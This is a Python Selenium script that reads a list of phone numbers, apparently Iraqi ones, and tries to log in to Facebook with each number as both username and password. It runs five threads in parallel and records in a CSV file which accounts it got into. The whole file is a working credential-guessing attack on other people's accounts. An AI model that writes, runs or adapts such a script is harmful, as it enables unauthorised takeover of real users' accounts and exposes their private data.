from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import csv
import os
import concurrent.futures

class WebAutomation:
    def __init__(self):
        self.driver = None

    def setup(self):
        # Setup Chrome WebDriver in headless mode
        options = webdriver.ChromeOptions()
        # options.add_argument("--headless")  # Run in headless mode
        # options.add_argument("--no-sandbox")
        # options.add_argument("--disable-dev-shm-usage")
        self.driver = webdriver.Chrome(options=options)

    def navigate(self, url):
        self.driver.get(url)

    def find_element(self, by, value):
        return WebDriverWait(self.driver, 5).until(  # Reduced wait time
            EC.presence_of_element_located((by, value))
        )

    def input_text(self, by, value, text):
        element = self.find_element(by, value)
        element.clear()
        element.send_keys(text)

    def click_element(self, by, value):
        element = self.find_element(by, value)
        element.click()

    def close(self):
        if self.driver:
            self.driver.quit()

def save_login_result(phoneNumber, success):
    # Define the CSV file name
    csv_file = 'login_results.csv'
    file_exists = os.path.isfile(csv_file)

    # Open the CSV file in append mode
    with open(csv_file, mode='a', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        if not file_exists:
            writer.writerow(['PhoneNumber', 'LoginStatus'])
        writer.writerow([phoneNumber, 'Success' if success else 'Failed'])

def login(phoneNumber):
    password = phoneNumber  # Replace with your password

    automation = WebAutomation()
    try:
        automation.setup()
        automation.navigate("https://www.facebook.com/")

        # Input the phone number or email
        automation.input_text(By.ID, "email", phoneNumber)
        
        # Input the password
        automation.input_text(By.ID, "pass", password)

        # Click the login button
        automation.click_element(By.XPATH, "//button[@name='login']")

        # Wait for the login process to complete (dynamic wait for a specific element)
        try:
            WebDriverWait(automation.driver, 10).until(
                EC.presence_of_element_located((By.XPATH, "//div[@aria-label='Account']"))  # Adjust this as needed
            )
            print(f"Login successful for: {phoneNumber}")
            save_login_result(phoneNumber, True)
        except:
            print(f"Login failed for: {phoneNumber}")
            save_login_result(phoneNumber, False)

    except Exception as e:
        print(f"An error occurred: {e}")

    finally:
        automation.close()
        
# Example usage
if __name__ == "__main__":
    phone_numbers = []
    with open('E:/testNumberFacebook/Data/q1.txt', encoding='utf-8') as file:
        for line in file:
            try:
                phone_number = line.split(',')[1].replace('+964', "0") # Clean up the phone number
                phone_numbers.append(phone_number)
            except:
                pass
    # Use multithreading to log in
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:  # Adjust max_workers as needed
        executor.map(login, phone_numbers)
